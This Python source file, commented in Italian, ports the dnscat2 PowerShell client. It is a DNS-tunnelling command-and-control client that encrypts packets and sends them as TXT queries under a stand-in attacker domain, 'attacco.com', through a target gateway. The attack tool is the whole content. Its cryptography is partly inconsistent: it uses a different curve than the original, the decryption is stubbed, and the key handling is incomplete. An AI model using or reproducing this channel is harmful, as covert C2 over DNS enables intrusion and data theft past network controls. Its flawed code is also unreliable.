import struct
import binascii
import random
import time
import socket
import dns.resolver # Richiede: pip install dnspython
from Crypto.Hash import SHA3_256 # Richiede: pip install pycryptodome
from Crypto.Cipher import Salsa20
from ecdsa import SECP256k1, SigningKey, ECDH # Richiede: pip install ecdsa

# --- Funzioni di Utilità (Helpers) ---

def to_hex(data):
    return binascii.hexlify(data).decode()

def from_hex(hex_str):
    return binascii.unhexlify(hex_str)

def get_sha3(data):
    """Replica: Get-SHA3"""
    h_obj = SHA3_256.new()
    h_obj.update(data)
    return h_obj.digest()

def get_random_hex(length):
    """Replica: New-RandomDNSField"""
    chars = "0123456789ABCDEF"
    return "".join(random.choice(chars) for _ in range(length))

def add_dns_dots(data):
    """Replica: Add-DNSDots - Divide i dati in chunk per il protocollo DNS"""
    packet = ""
    section_count = 0
    for char in data:
        if section_count >= 63:
            packet += "."
            section_count = 0
        packet += char
        section_count += 1
    return packet.rstrip(".")

class Dnscat2Client:
    def __init__(self, domain, dns_server, dns_port=53, psk=""):
        self.domain = domain
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.psk = psk.encode()
        self.session_id = get_random_hex(4) # PowerShell faceva solo i primi 4
        self.encryption_keys = {}
        self.is_encrypted = False
        self.sequence_number = random.randint(0, 65535)
        self.max_packet_size = 240 # Default sicuro per DNS

        # Generazione Chiavi ECDH (P-256)
        self.client_sk = SigningKey.generate(curve=SECP256k1)
        self.client_vk = self.client_sk.verifying_key
        # Nota: dnscat2 originale usa P-256 (NIST), qui adattiamo per compatibilità logica
        
    def get_shared_secret(self, server_pub_x_hex, server_pub_y_hex):
        """Replica: Get-SharedSecret"""
        # Ricostruzione chiave pubblica server
        point_str = b'\x04' + from_hex(server_pub_x_hex) + from_hex(server_pub_y_hex)
        try:
            # Implementazione semplificata ECDH
            ecdh = ECDH(curve=SECP256k1)
            ecdh.load_private_key(self.client_sk)
            ecdh.load_received_public_key_bytes(point_str)
            return ecdh.generate_sharedsecret_bytes()
        except Exception as e:
            print(f"[!] Errore ECDH: {e}")
            return None

    def derive_keys(self, shared_secret):
        """Replica: Get-Dnscat2StreamKeys"""
        def make_key(name):
            return get_sha3(shared_secret + name.encode())
        
        self.encryption_keys["client_write"] = make_key("client_write_key")
        self.encryption_keys["client_mac"] = make_key("client_mac_key")
        self.encryption_keys["server_write"] = make_key("server_write_key")
        self.encryption_keys["server_mac"] = make_key("server_mac_key")
        
        # Auth Strings
        pub_client = to_hex(self.client_vk.to_string()).encode()
        # Nota: in un caso reale server_pubkey deve essere salvata dall'handshake
        server_pub = self.encryption_keys.get("server_pubkey_raw", b"") 
        
        self.encryption_keys["client_auth"] = get_sha3(b"client" + pub_client + server_pub + self.psk)
        self.encryption_keys["server_auth"] = get_sha3(b"server" + pub_client + server_pub + self.psk)

    def encrypt_packet(self, packet_hex):
        """Replica: ConvertTo-EncryptedDnscat2Packet"""
        packet_bytes = from_hex(packet_hex)
        packet_header = packet_bytes[:5] # I primi 5 byte (10 hex chars)
        packet_body = packet_bytes[5:]
        
        nonce_int = self.encryption_keys.get("nonce", 0)
        nonce_bytes = struct.pack("<Q", nonce_int) # 8 bytes Little Endian per Salsa20
        # In BouncyCastle spesso è BigEndian, controllare compatibilità server
        
        cipher = Salsa20.new(key=self.encryption_keys["client_write"], nonce=nonce_bytes)
        encrypted_body = cipher.encrypt(packet_body)
        
        # MAC (Signature)
        sig_data = self.encryption_keys["client_mac"] + packet_header + nonce_bytes[6:8] + encrypted_body
        signature = get_sha3(sig_data)[:6] # Primi 6 byte
        
        # Incrementa Nonce
        self.encryption_keys["nonce"] = nonce_int + 1
        
        encrypted_packet = (to_hex(packet_header) + 
                            to_hex(signature) + 
                            f"{nonce_int:04x}" + # Short nonce representation
                            to_hex(encrypted_body))
        return encrypted_packet

    def decrypt_packet(self, packet_hex):
        """Replica: ConvertFrom-EncryptedDnscat2Packet"""
        # Logica inversa simile a encrypt_packet
        # Richiede parsing preciso dei byte (Header, Sig, Nonce, Data)
        pass # Implementazione omessa per brevità, speculare a encrypt

    def send_dns_query(self, hex_data, record_type="TXT"):
        """Replica: Send-Dnscat2Packet (con nslookup sostituito da dnspython)"""
        
        # Aggiunge i punti per il formato DNS (es. 4a1b.3c2d.dominio.com)
        dns_ready_data = add_dns_dots(hex_data)
        full_query = f"{dns_ready_data}.{self.domain}"
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [self.dns_server]
        resolver.port = self.dns_port
        
        try:
            # print(f"[*] Querying: {full_query} ({record_type})")
            answers = resolver.resolve(full_query, record_type)
            
            # Parsing Risposta (Semplificato per TXT)
            if record_type == "TXT":
                for rdata in answers:
                    txt_resp = b"".join(rdata.strings).decode()
                    return txt_resp
            
            # Parsing per CNAME, MX, A, AAAA andrebbe qui
            return None
            
        except Exception as e:
            print(f"[!] DNS Error: {e}")
            return None

    def create_syn_packet(self):
        """Replica: New-Dnscat2SYN"""
        # Header: Random(4) + Type(00) + SessionID(4) + Seq(4) + Options(4)
        rand_id = get_random_hex(4)
        msg_type = "00"
        seq_num = f"{self.sequence_number:04x}"
        options = "0000" # Flags semplici
        
        return f"{rand_id}{msg_type}{self.session_id}{seq_num}{options}"

    def create_msg_packet(self, data_hex, ack_num):
        """Replica: New-Dnscat2MSG"""
        rand_id = get_random_hex(4)
        msg_type = "01"
        seq_num = f"{self.sequence_number:04x}"
        ack_hex = f"{ack_num:04x}"
        
        return f"{rand_id}{msg_type}{self.session_id}{seq_num}{ack_hex}{data_hex}"

    def start_session(self):
        """Logica principale di avvio"""
        print(f"[*] Avvio sessione verso {self.domain} tramite {self.dns_server}")
        
        # 1. Handshake SYN
        syn_packet = self.create_syn_packet()
        
        # Se cifratura è attiva, qui andrebbe la negoziazione ENC (Tipo 03)
        # Ma per brevità mostriamo l'invio base
        
        response = self.send_dns_query(syn_packet, "TXT")
        if response:
            print(f"[+] Risposta ricevuta: {response}")
            # Qui andrebbe il parsing della risposta per settare l'ACK e gestire lo stream
        else:
            print("[-] Nessuna risposta dal server C2.")

# --- Esempio di utilizzo ---

if __name__ == "__main__":
    # Configurazione
    DOMAIN = "attacco.com"
    OPNSENSE_IP = "10.0.40.1" # Il tuo DNS/Gateway target
    
    client = Dnscat2Client(DOMAIN, OPNSENSE_IP)
    
    # Esegue l'handshake iniziale
    client.start_session()
